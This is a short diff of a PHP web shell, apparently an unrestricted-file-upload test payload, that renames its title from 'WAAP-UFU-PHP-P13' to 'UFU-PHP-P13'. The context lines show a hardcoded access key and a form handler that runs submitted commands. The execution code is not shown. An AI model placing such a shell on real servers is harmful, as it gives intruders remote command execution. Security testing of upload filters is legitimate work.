@@ -1,5 +1,5 @@
 <?php
-// Usage: {HOST}/WAAP-UFU-PHP-P13.php?key=hehe
+// Usage: {HOST}/UFU-PHP-P13.php?key=hehe
 
 // The secret key you will use to access the shell via the "?key=" URL parameter.
 $secretkey = 'hehe';
@@ -36,7 +36,7 @@ if (isset($_POST['execute']) && !empty($_POST['command']) && $_POST['key'] == $s
 <html>
 
 <head>
-    <title>WAAP-UFU-PHP-P13</title>
+    <title>UFU-PHP-P13</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/darkly/bootstrap.min.css">
@@ -46,7 +46,7 @@ if (isset($_POST['execute']) && !empty($_POST['command']) && $_POST['key'] == $s
     <div class="container">
         <div class="mt-5 mb-4 row">
             <div class="col-sm-auto my-auto">
-                <h1>WAAP-UFU-PHP-P13</h1>
+                <h1>UFU-PHP-P13</h1>
             </div>
             <div class="col-sm-auto my-auto">
                 <form method="POST">
